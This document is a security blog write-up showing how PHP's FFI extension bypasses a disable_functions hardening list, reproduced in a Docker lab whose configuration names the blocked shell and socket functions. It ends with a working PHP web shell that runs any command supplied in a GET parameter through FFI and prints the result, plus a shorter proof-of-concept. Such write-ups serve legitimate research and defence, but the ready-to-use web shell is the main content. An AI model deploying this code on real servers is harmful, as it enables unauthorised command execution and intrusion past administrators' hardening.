---
title: PHP - Bypass Disable Functions Using FFI
tags: php disable_functions bypass ffi
---

# Description

Recently, I encountered a situation where most PHP functions were disabled. To facilitate more accurate debugging and analysis, I recreated the environment in a Docker container.

# Docker setup

## Dockerfile

```
FROM php:8.0-apache

RUN apt update
RUN apt install nano libffi-dev
RUN docker-php-ext-configure ffi --with-ffi
RUN docker-php-ext-install ffi

RUN echo "<?php phpinfo();?>" > phpinfo.php
COPY ffi_bypass.php /var/www/html/ffi_bypass.php

RUN cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini
RUN sed -i "s|;ffi.enable=preload|ffi.enable=true|g" /usr/local/etc/php/php.ini
RUN sed -i "s|disable_functions =|disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen|g" /usr/local/etc/php/php.ini

RUN chown -R www-data:www-data /var/www/html/

ENTRYPOINT ["apache2-foreground"]
```

## Build

```
docker build -t phpffi .
```

## Run 

```
docker run --rm -ti -p 8081:80 phpffi
```

In order to access the web application running in the Docker container, I exposed port `80` in the container to port `8081` on my local machine.

# PHPInfo

![image](https://user-images.githubusercontent.com/84577967/175967517-1f444bfa-dda2-4a68-9858-db0a007eb157.png)

## Disable Functions List

It's possible that you are wondering why the application was originally written in PHP 😆! Don't worry about it and just keep reading! No complaining allowed.

![image](https://user-images.githubusercontent.com/84577967/175967567-28591459-8d33-4b91-b5e5-13e175e6660f.png)

What took my attention that FFI is **enable** !

![image](https://user-images.githubusercontent.com/84577967/177450983-8abfc720-d340-4d9e-a1bc-de89f6a8853c.png)

# Foreign Function Interface (FFI)

## Important note

**This extension is disabled in the default PHP installation.**

![image](https://user-images.githubusercontent.com/84577967/177450600-bb90dca4-c30c-4ca6-9970-e7e5a74d9900.png)

## Introduction

![image](https://user-images.githubusercontent.com/84577967/175815888-f097b514-c0ae-47ef-aee9-01ae58e1c99b.png)

## Bypass disable functions

The FFI (Foreign Function Interface) extension in PHP allows developers to call any C function from within PHP code. This can be very useful, as it allows you to execute command-line functions such as `system()`. [system](https://www.tutorialspoint.com/c_standard_library/c_function_system.htm)

![image](https://user-images.githubusercontent.com/84577967/177451478-a105560b-18e3-48af-9ee5-65b67419a098.png)

We have to create a new FFI object using the `cdef` function

![image](https://user-images.githubusercontent.com/84577967/177452813-c9cbf070-cd3a-40c8-85f5-232f7c81417c.png)

Despite my initial efforts, I was unable to execute commands using the FFI extension. After some trial and error, I realized that the problem was with my attempts to print the results using functions such as echo or print. These functions are not capable of properly displaying the output of command-line functions, so I had to find a different way to retrieve and display the results of my commands.

Ultimately, I was able to create a small PHP script to test whether I was able to execute commands using the FFI extension. The script attempted to create a file named test, which would be an indication that command execution was successful. The code I used:

```php
<?php 
$ffi=FFI::cdef("int system(const char *command);");
$ffi->system('echo "test" > test');
?>
```

And it worked !

![image](https://user-images.githubusercontent.com/84577967/177454143-0ac183c1-eb0e-4a25-b8bf-9ee195f5325e.png)


## Final code

The PHP code below can be used to execute and print the result of any command:

```php
<?php
if(isset($_GET['cmd'])){
    $cmd=$_GET['cmd'];
    $rand=rand();
    $ffi = FFI::cdef("int system(const char *command);");
    $ffi->system("{$cmd} > /dev/shm/{$rand}");
    echo file_get_contents("/dev/shm/{$rand}");
    $ffi->system("rm /dev/shm/{$rand}");
}
?>
```

And the usage is pretty simple: `http://127.0.0.1:8081/bypass.php?cmd=id`

![image](https://user-images.githubusercontent.com/84577967/177454294-dc030ac4-4c85-4dcb-916a-1649b5a93ed7.png)
